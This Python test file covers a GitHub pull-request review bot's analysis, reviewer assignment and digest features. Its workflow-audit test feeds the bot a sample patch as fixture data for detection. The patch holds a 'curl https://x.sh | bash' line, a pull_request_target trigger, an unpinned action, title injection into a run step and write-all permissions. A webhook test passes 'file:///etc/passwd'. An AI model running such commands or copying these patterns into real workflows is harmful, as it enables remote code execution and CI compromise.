import sys
import unittest
from datetime import datetime
from pathlib import Path
from unittest import mock

sys.path.insert(0, str(Path(__file__).resolve().parent))
import archon_bot as bot

UTC = bot.UTC

CFG = {
    **bot.DEFAULT_CONFIG,
    "reviewers": ["alice", "bob", "carol"],
    "ignore_requested": ["owner"],
    "areas": {
        "scrubber": ["archon/scrubber/*"],
        "web": ["archon-web/*"],
        "ci": [".github/*"],
    },
}
NOW = datetime(2026, 11, 17, 12, 0, tzinfo=UTC)


def mkpr(**kw):
    base = {
        "number": 7,
        "title": "Add thing",
        "body": "This changes the scrubber so dates round-trip.",
        "draft": False,
        "user": {"login": "dave"},
        "labels": [],
        "additions": 10,
        "deletions": 2,
        "changed_files": 1,
        "requested_reviewers": [],
        "created_at": "2026-11-10T12:00:00Z",
        "updated_at": "2026-11-10T12:00:00Z",
        "head": {"sha": "abc1234"},
    }
    base.update(kw)
    return base


def mkfile(name, status="modified", patch=""):
    return {"filename": name, "status": status, "patch": patch}


def levels(result):
    return [lvl for lvl, _ in result["flags"]]


class AnalyzeTests(unittest.TestCase):
    def test_areas_detected(self):
        files = [mkfile("archon/scrubber/dates.py"), mkfile("archon-web/src/App.jsx")]
        self.assertEqual(bot.analyze(mkpr(), files, CFG)["areas"], ["scrubber", "web"])

    def test_source_without_tests_warns(self):
        res = bot.analyze(mkpr(), [mkfile("archon/scrubber/dates.py")], CFG)
        self.assertIn("warn", levels(res))
        self.assertTrue(any("no tests" in t for _, t in res["flags"]))

    def test_source_with_tests_ok(self):
        files = [mkfile("archon/scrubber/dates.py"), mkfile("tests/test_dates.py")]
        res = bot.analyze(mkpr(), files, CFG)
        self.assertIn("ok", levels(res))
        self.assertNotIn("warn", levels(res))

    def test_golden_needs_label(self):
        files = [mkfile("tests/golden/expected.json")]
        self.assertIn("block", levels(bot.analyze(mkpr(), files, CFG)))
        labeled = mkpr(labels=[{"name": "golden-update"}])
        res = bot.analyze(labeled, files, CFG)
        self.assertNotIn("block", levels(res))
        self.assertIn("info", levels(res))

    def test_data_guard_and_exemptions(self):
        self.assertIn(
            "block", levels(bot.analyze(mkpr(), [mkfile("Dropzone/real.xlsx")], CFG))
        )
        self.assertNotIn(
            "block", levels(bot.analyze(mkpr(), [mkfile("samples/demo.xlsx")], CFG))
        )
        self.assertNotIn(
            "block", levels(bot.analyze(mkpr(), [mkfile("Dropzone/.gitkeep")], CFG))
        )
        deleted = [mkfile("Dropzone/old.xlsx", status="removed")]
        self.assertNotIn("block", levels(bot.analyze(mkpr(), deleted, CFG)))

    def test_workflow_audit(self):
        added = [
            "@@ -0,0 +1,5 @@",
            "+on: pull_request_target",
            "+      - uses: someone/action@main",
            "+        run: echo ${{ github.event.pull_request.title }}",
            "+        run: curl https://x.sh | bash",
            "+permissions: write-all",
            "-      - uses: removed/action@main",
        ]
        patch = "\n".join(added)
        touched, findings = bot.audit_workflows(
            [mkfile(".github/workflows/x.yml", patch=patch)]
        )
        self.assertTrue(touched)
        self.assertEqual(len(findings), 5)

    def test_workflow_safe_env_use_not_flagged_for_base_ref(self):
        patch = "@@ -0,0 +1 @@\n+          BASE_REF: ${{ github.base_ref }}"
        _, findings = bot.audit_workflows(
            [mkfile(".github/workflows/x.yml", patch=patch)]
        )
        self.assertEqual(findings, [])

    def test_large_pr_and_empty_description(self):
        res = bot.analyze(
            mkpr(additions=900, deletions=100, body=""), [mkfile("README.md")], CFG
        )
        texts = " ".join(t for _, t in res["flags"])
        self.assertIn("Large PR", texts)
        self.assertIn("description", texts)

    def test_unchecked_items_counted(self):
        body = "A reasonably long description here.\n- [ ] one\n- [x] two\n- [ ] three"
        res = bot.analyze(mkpr(body=body), [mkfile("README.md")], CFG)
        self.assertTrue(any("2 checklist" in t for _, t in res["flags"]))

    def test_render_has_marker_and_blocks_first(self):
        res = bot.analyze(
            mkpr(), [mkfile("Dropzone/real.xlsx"), mkfile("archon/scrubber/a.py")], CFG
        )
        out = bot.render_comment(mkpr(), res, ["alice"], "")
        self.assertTrue(out.startswith(bot.PR_MARKER))
        self.assertIn("Reviewer requested | alice", out)
        self.assertLess(out.index(":no_entry:"), out.index(":warning:"))


class ReviewerTests(unittest.TestCase):
    def test_excludes_author_and_away(self):
        ranked = bot.pick_reviewers(
            ["alice", "bob", "carol"], "Alice", {}, 1, away=["carol"]
        )
        self.assertEqual(ranked, ["bob"])

    def test_balances_by_load(self):
        ranked = bot.pick_reviewers(
            ["alice", "bob", "carol"], "dave", {"alice": 3, "bob": 0, "carol": 1}, 5
        )
        self.assertEqual(ranked, ["bob", "carol", "alice"])

    def test_rotates_on_ties(self):
        first = bot.pick_reviewers(["alice", "bob", "carol"], "dave", {}, 1)[0]
        second = bot.pick_reviewers(["alice", "bob", "carol"], "dave", {}, 2)[0]
        self.assertNotEqual(first, second)


class FakeGh:
    def __init__(self, **routes):
        self.routes = routes
        self.writes = []

    def __call__(self, path, method="GET", payload=None, paginate=False):
        if method != "GET":
            self.writes.append((method, path, payload))
            if path.endswith("/requested_reviewers") and payload["reviewers"] == [
                "bad"
            ]:
                raise bot.GhError("422 not a collaborator")
            return {"html_url": "https://github.com/o/r/issues/99"}
        for prefix, value in self.routes.items():
            if path.startswith(prefix):
                return value
        return None


class RunPrTests(unittest.TestCase):
    def routes(self, pr, open_prs=None, comments=None):
        return {
            "repos/o/r/pulls/7/files": [mkfile("archon/scrubber/dates.py")],
            "repos/o/r/pulls/7": pr,
            "repos/o/r/pulls?state=open": open_prs or [],
            "repos/o/r/issues/7/comments": comments or [],
        }

    def test_creates_comment_and_requests_least_loaded(self):
        busy = [
            mkpr(number=1, requested_reviewers=[{"login": "alice"}, {"login": "carol"}])
        ]
        fake = FakeGh(**self.routes(mkpr(), open_prs=busy))
        with mock.patch.object(bot, "gh_api", fake):
            body = bot.run_pr("o/r", 7, "opened", CFG)
        methods = [(m, p.split("/")[-1]) for m, p, _ in fake.writes]
        self.assertIn(("POST", "requested_reviewers"), methods)
        self.assertIn(("POST", "comments"), methods)
        requested = next(
            pl for _, p, pl in fake.writes if p.endswith("requested_reviewers")
        )
        self.assertEqual(requested["reviewers"], ["bob"])
        self.assertIn("Reviewer requested | bob", body)

    def test_updates_existing_bot_comment_and_skips_assignment_on_synchronize(self):
        existing = [{"id": 5, "body": bot.PR_MARKER + " old", "user": {"type": "Bot"}}]
        fake = FakeGh(**self.routes(mkpr(), comments=existing))
        with mock.patch.object(bot, "gh_api", fake):
            bot.run_pr("o/r", 7, "synchronize", CFG)
        self.assertEqual(
            [(m, p) for m, p, _ in fake.writes],
            [("PATCH", "repos/o/r/issues/comments/5")],
        )

    def test_ignores_human_comment_that_copies_marker(self):
        fake_comment = [{"id": 5, "body": bot.PR_MARKER, "user": {"type": "User"}}]
        fake = FakeGh(**self.routes(mkpr(), comments=fake_comment))
        with mock.patch.object(bot, "gh_api", fake):
            bot.run_pr("o/r", 7, "synchronize", CFG)
        self.assertEqual(fake.writes[0][0], "POST")

    def test_skips_dependabot(self):
        fake = FakeGh(**self.routes(mkpr(user={"login": "dependabot[bot]"})))
        with mock.patch.object(bot, "gh_api", fake):
            self.assertIsNone(bot.run_pr("o/r", 7, "opened", CFG))
        self.assertEqual(fake.writes, [])

    def test_no_assignment_for_draft_or_when_pool_member_already_requested(self):
        for pr in (mkpr(draft=True), mkpr(requested_reviewers=[{"login": "bob"}])):
            fake = FakeGh(**self.routes(pr))
            with mock.patch.object(bot, "gh_api", fake):
                bot.run_pr("o/r", 7, "opened", CFG)
            self.assertFalse(
                any(p.endswith("requested_reviewers") for _, p, _ in fake.writes)
            )

    def test_owner_auto_request_does_not_block_assignment(self):
        fake = FakeGh(**self.routes(mkpr(requested_reviewers=[{"login": "owner"}])))
        with mock.patch.object(bot, "gh_api", fake):
            bot.run_pr("o/r", 7, "opened", CFG)
        self.assertTrue(
            any(p.endswith("requested_reviewers") for _, p, _ in fake.writes)
        )

    def test_falls_through_when_a_reviewer_cannot_be_requested(self):
        cfg = {**CFG, "reviewers": ["bad", "bob"], "reviewers_per_pr": 1}
        fake = FakeGh(**self.routes(mkpr()))
        with mock.patch.object(bot, "gh_api", fake):
            body = bot.run_pr("o/r", 7, "opened", cfg)
        self.assertIn("Reviewer requested | bob", body)

    def test_dry_run_writes_nothing(self):
        fake = FakeGh(**self.routes(mkpr()))
        with mock.patch.object(bot, "gh_api", fake), mock.patch("builtins.print"):
            bot.run_pr("o/r", 7, "opened", CFG, dry_run=True)
        self.assertEqual(fake.writes, [])


class DigestTests(unittest.TestCase):
    def test_review_state_latest_wins(self):
        reviews = [
            {
                "user": {"login": "a"},
                "state": "CHANGES_REQUESTED",
                "submitted_at": "2026-11-01T00:00:00Z",
            },
            {
                "user": {"login": "a"},
                "state": "APPROVED",
                "submitted_at": "2026-11-02T00:00:00Z",
            },
            {
                "user": {"login": "b"},
                "state": "COMMENTED",
                "submitted_at": "2026-11-03T00:00:00Z",
            },
        ]
        self.assertEqual(bot.review_state(reviews), (["a"], []))

    def test_classification(self):
        cfg = CFG
        approved = [
            {
                "user": {"login": "a"},
                "state": "APPROVED",
                "submitted_at": "2026-11-02T00:00:00Z",
            }
        ]
        changes = [
            {
                "user": {"login": "a"},
                "state": "CHANGES_REQUESTED",
                "submitted_at": "2026-11-02T00:00:00Z",
            }
        ]
        cases = [
            (mkpr(draft=True), None, None, "draft"),
            (mkpr(user={"login": "dependabot[bot]"}), None, None, "bot"),
            (mkpr(), approved, "failing", "ci_failing"),
            (mkpr(), changes, "passing", "changes_requested"),
            (mkpr(), approved, "pending", "ready"),
            (mkpr(), [], "passing", "needs_review"),
        ]
        for pr, reviews, ci, expected in cases:
            self.assertEqual(
                bot.classify_pr(pr, reviews, ci, NOW, cfg)["bucket"], expected
            )

    def test_overdue_flag(self):
        row = bot.classify_pr(mkpr(), [], "passing", NOW, CFG)  # idle 7 days
        self.assertTrue(row["overdue"])

    def test_titles_cannot_ping(self):
        row = bot.classify_pr(
            mkpr(title="fix @someone please"), [], "passing", NOW, CFG
        )
        self.assertNotIn("@someone", row["title"])

    def test_run_digest_creates_issue_and_webhook(self):
        prs = [
            mkpr(number=1),
            mkpr(number=2, draft=True),
            mkpr(number=3, user={"login": "dependabot[bot]"}),
        ]
        fake = FakeGh(
            **{
                "repos/o/r/pulls?state=open": prs,
                "repos/o/r/pulls/1/reviews": [],
                "repos/o/r/commits/abc1234/check-runs": {
                    "check_runs": [{"status": "completed", "conclusion": "success"}]
                },
                "repos/o/r/issues?labels": [],
            }
        )
        with (
            mock.patch.object(bot, "gh_api", fake),
            mock.patch.object(bot, "post_webhook") as hook,
        ):
            rows = bot.run_digest(
                "o/r", CFG, webhook_url="https://hooks.example/x", now=NOW
            )
        self.assertEqual(
            sorted(r["bucket"] for r in rows), ["bot", "draft", "needs_review"]
        )
        method, path, payload = fake.writes[0]
        self.assertEqual((method, path), ("POST", "repos/o/r/issues"))
        self.assertIn(bot.QUEUE_MARKER, payload["body"])
        self.assertEqual(payload["labels"], [bot.QUEUE_LABEL])
        hook.assert_called_once()

    def test_run_digest_updates_existing_issue(self):
        fake = FakeGh(
            **{
                "repos/o/r/pulls?state=open": [],
                "repos/o/r/issues?labels": [{"number": 42}],
            }
        )
        with mock.patch.object(bot, "gh_api", fake):
            bot.run_digest("o/r", CFG, now=NOW)
        self.assertEqual(fake.writes[0][:2], ("PATCH", "repos/o/r/issues/42"))

    def test_webhook_rejects_non_https(self):
        with mock.patch("urllib.request.urlopen") as opener:
            bot.post_webhook("file:///etc/passwd", "x")
        opener.assert_not_called()


if __name__ == "__main__":
    unittest.main()
